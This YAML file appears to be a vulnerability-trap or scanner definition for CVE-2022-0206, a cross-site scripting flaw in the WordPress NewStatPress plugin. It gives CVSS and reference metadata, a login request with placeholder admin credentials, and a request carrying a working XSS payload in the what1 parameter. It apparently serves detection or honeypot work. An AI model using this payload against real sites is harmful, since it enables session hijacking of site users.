id: CVE-2022-0206
info:
  name: WordPress NewStatPress <1.3.6 - Cross-Site Scripting
  author: r3Y3r53
  description: 'WordPress NewStatPress plugin before 1.3.6 is susceptible to cross-site
    scripting. The plugin does not properly escape the whatX parameters before outputting
    them back in attributes. An attacker can inject arbitrary script in the browser
    of an unsuspecting user in the context of the affected site. This can allow the
    attacker to steal cookie-based authentication credentials and launch other attacks.

    '
  severity: medium
  impact: 'Successful exploitation of this vulnerability could allow an attacker to
    inject malicious scripts into the affected website, leading to potential data
    theft, session hijacking, or defacement.

    '
  remediation: Fixed in version 1.3.6.
  reference:
  - https://wpscan.com/vulnerability/ce12437a-d440-4c4a-9247-95a8f39d00b9
  - https://wordpress.org/plugins/newstatpress
  - https://nvd.nist.gov/vuln/detail/CVE-2022-0206
  - https://github.com/ARPSyndicate/cvemon
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cve-id: CVE-2022-0206
    cwe-id: CWE-79
    epss-score: 0.00106
    epss-percentile: 0.42122
    cpe: cpe:2.3:a:newstatpress_project:newstatpress:*:*:*:*:*:wordpress:*:*
  metadata:
    verified: true
    max-request: 2
    vendor: newstatpress_project
    product: newstatpress
    framework: wordpress
  tags: cve,cve2022,xss,wp,authenticated,wordpress,wp-plugin,newstatpress,wpscan,newstatpress_project
traps:
- request:
    method: POST
    path: /wp-login.php
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: 'log=admin&pwd=admin123&wp-submit=Log+In

      '
  response:
    status_code: 200
    headers: {}
    body: ''
- request:
    method: GET
    path: /wp-admin/admin.php?page=nsp_search&what1=%27+style%3Danimation-name%3Arotation+onanimationstart%3Dalert%28document.domain%29+x
    headers: {}
    body: ''
  response:
    status_code: 200
    headers:
      VulTrap: text/html
    body: onanimationstart=alert(document.domain)newstatpress_page
